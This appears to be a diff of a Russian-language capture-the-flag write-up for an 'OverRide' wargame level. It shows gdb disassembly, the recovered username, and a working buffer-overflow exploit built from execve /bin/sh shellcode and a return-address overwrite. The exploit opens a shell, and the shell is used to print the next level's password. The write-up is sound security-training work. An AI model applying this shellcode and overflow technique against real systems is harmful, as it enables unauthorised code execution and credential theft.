@@ -1,67 +1,46 @@
-У нас есть бинарный файл, который требует ввода некоего username
-
+____________________________________________________________
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
+____________________________________________________________
+
 level01@OverRide:~$ ./level01
+____________________________________________
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: level02
 verifying username....
 
 nope, incorrect username...
+____________________________________________
+У нас есть бинарный файл, который требует ввода некоего username
+
+Прооверяем, что там есть:
 
 (gdb) info var
+________________________________________________
 All defined variables:
 
 Non-debugging symbols:
-0x08048688  _fp_hw
-0x0804868c  _IO_stdin_used
-0x08048898  __FRAME_END__
-0x08049f14  __CTOR_LIST__
-0x08049f14  __init_array_end
-0x08049f14  __init_array_start
-0x08049f18  __CTOR_END__
-0x08049f1c  __DTOR_LIST__
-0x08049f20  __DTOR_END__
-0x08049f24  __JCR_END__
-0x08049f24  __JCR_LIST__
-0x08049f28  _DYNAMIC
-0x08049ff4  _GLOBAL_OFFSET_TABLE_
-0x0804a014  __data_start
-0x0804a014  data_start
-0x0804a018  __dso_handle
-0x0804a020  stdin@@GLIBC_2.0
-0x0804a024  completed.6159
-0x0804a028  dtor_idx.6161
+(...)
 0x0804a040  a_user_name
+________________________________________________
 
 (gdb) info func
+________________________________________________
 All defined functions:
 
 Non-debugging symbols:
-0x08048318  _init
-0x08048360  printf
-0x08048360  printf@plt
-0x08048370  fgets
-0x08048370  fgets@plt
-0x08048380  puts
-0x08048380  puts@plt
-0x08048390  __gmon_start__
-0x08048390  __gmon_start__@plt
-0x080483a0  __libc_start_main
-0x080483a0  __libc_start_main@plt
-0x080483b0  _start
-0x080483e0  __do_global_dtors_aux
-0x08048440  frame_dummy
+(...)
 0x08048464  verify_user_name
 0x080484a3  verify_user_pass
 0x080484d0  main
-0x080485c0  __libc_csu_init
-0x08048630  __libc_csu_fini
-0x08048632  __i686.get_pc_thunk.bx
-0x08048640  __do_global_ctors_aux
-0x0804866c  _fini
+(...)
+________________________________________________
+
+У нас есть одна глобальная переменная a_user_name и две самописные функции: verify_user_name и verify_user_pass.
+Разберем каждую функцию:
 
 (gdb) disass main
+____________________________________________________________________________________________________________________________________________________
 Dump of assembler code for function main:
    0x080484d0 <+0>:	push   %ebp
    0x080484d1 <+1>:	mov    %esp,%ebp
@@ -105,7 +84,6 @@ Dump of assembler code for function main:
    0x08048579 <+169>:	lea    0x1c(%esp),%eax
    0x0804857d <+173>:	mov    %eax,(%esp)
    0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
----Type <return> to continue, or q <return> to quit---
    0x08048585 <+181>:	mov    %eax,0x5c(%esp)
    0x08048589 <+185>:	cmpl   $0x0,0x5c(%esp)
    0x0804858e <+190>:	je     0x8048597 <main+199>
@@ -122,26 +100,10 @@ Dump of assembler code for function main:
    0x080485b4 <+228>:	pop    %ebp
    0x080485b5 <+229>:	ret
 End of assembler dump.
-
-(gdb) disass frame_dummy
-Dump of assembler code for function frame_dummy:
-   0x08048440 <+0>:	push   %ebp
-   0x08048441 <+1>:	mov    %esp,%ebp
-   0x08048443 <+3>:	sub    $0x18,%esp                           24
-   0x08048446 <+6>:	mov    0x8049f24,%eax
-   0x0804844b <+11>:	test   %eax,%eax
-   0x0804844d <+13>:	je     0x8048461 <frame_dummy+33>        "\311ÐU\211\345WV\203\354\020\307\004$\220\206\004\b\350\b\377\377\377\272@\240\004\b\270\250\206\004\b\271\a"
-   0x0804844f <+15>:	mov    $0x0,%eax
-   0x08048454 <+20>:	test   %eax,%eax
-   0x08048456 <+22>:	je     0x8048461 <frame_dummy+33>
-   0x08048458 <+24>:	movl   $0x8049f24,(%esp)                 ""
-   0x0804845f <+31>:	call   *%eax
-   0x08048461 <+33>:	leave
-   0x08048462 <+34>:	ret
-   0x08048463 <+35>:	nop
-End of assembler dump.
+____________________________________________________________________________________________________________________________________________________
 
 (gdb) disass verify_user_name
+____________________________________________________________________________________________________________________________________________________
 Dump of assembler code for function verify_user_name:
    0x08048464 <+0>:	push   %ebp
    0x08048465 <+1>:	mov    %esp,%ebp
@@ -168,8 +130,10 @@ Dump of assembler code for function verify_user_name:
    0x080484a1 <+61>:	pop    %ebp
    0x080484a2 <+62>:	ret
 End of assembler dump.
+____________________________________________________________________________________________________________________________________________________
 
 (gdb) disass verify_user_pass
+____________________________________________________________________________________________________________________________________________________
 Dump of assembler code for function verify_user_pass:
    0x080484a3 <+0>:	push   %ebp
    0x080484a4 <+1>:	mov    %esp,%ebp
@@ -193,8 +157,13 @@ Dump of assembler code for function verify_user_pass:
    0x080484ce <+43>:	pop    %ebp
    0x080484cf <+44>:	ret
 End of assembler dump.
+____________________________________________________________________________________________________________________________________________________
+
+Программа выполняет авторизацию пользователя, при этом на вход ожидаются значения "dat_wil" в качестве username и "admin" в качестве пароля. 
+Попробуем ввести полученные данные:
 
 (gdb) r
+_____________________________________________________
 Starting program: /home/users/level01/level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: dat_wil
@@ -205,5 +174,58 @@ admin
 nope, incorrect password...
 
 [Inferior 1 (process 1900) exited with code 01]
+_____________________________________________________
+
+Мы узнали, что логин действительно dat_wil, но с паролем промахнулись.
+Также у нас не вызывается shell, поэтому нам нужно внедрить ее самостоятельно.
+Из проекта rainfall помним, что функция fgets() уязвима к переполнению буффера. 
+Используем эту уязвимость для совершения атаки на переполнение буффера.
+
+(gdb) r
+____________________________________________________________________________________________________________________________________________________
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+nope, incorrect password...
 
 
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()                                        сдвиг 80
+____________________________________________________________________________________________________________________________________________________
+
+Итак. благодаря (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) узнаем, что сдвиг равен 80.
+Теперь можно написать наш shellcode:
+
+0-7: «dat_wil», чтобы перескочить через функцию `verify_user_name`.
+8-32: наш 24-байтовый шелл-код
+32: '\n', чтобы сбросить первый fgets
+33-113: байты-заполнители, 80 из них для перезаписи eip следующими 4 байтами.
+113-117: адрес глобальной переменной, взятой выше + 7, чтобы игнорировать «dat_wil», который мы ввели первым
+
+level01@OverRide:~$ export shellcode=`python -c "print 'dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x08\x04\xa0\x47'[::-1]"`
+level01@OverRide:~$ echo $shellcode
+____________________________________________________________________________________________________________________________________________________
+dat_wil1�Ph//shh/bin��PS�ᙰ
+                           ̀ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaG�
+____________________________________________________________________________________________________________________________________________________
+
+level01@OverRide:~$ (python -c "print 'dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x08\x04\xa0\x47'[::-1]"; cat) | ./level01
+____________________________________________________________________________________________________________________________________________________
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+____________________________________________________________________________________________________________________________________________________
+Мы запустили shell.
+
+____________________________________________
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+____________________________________________
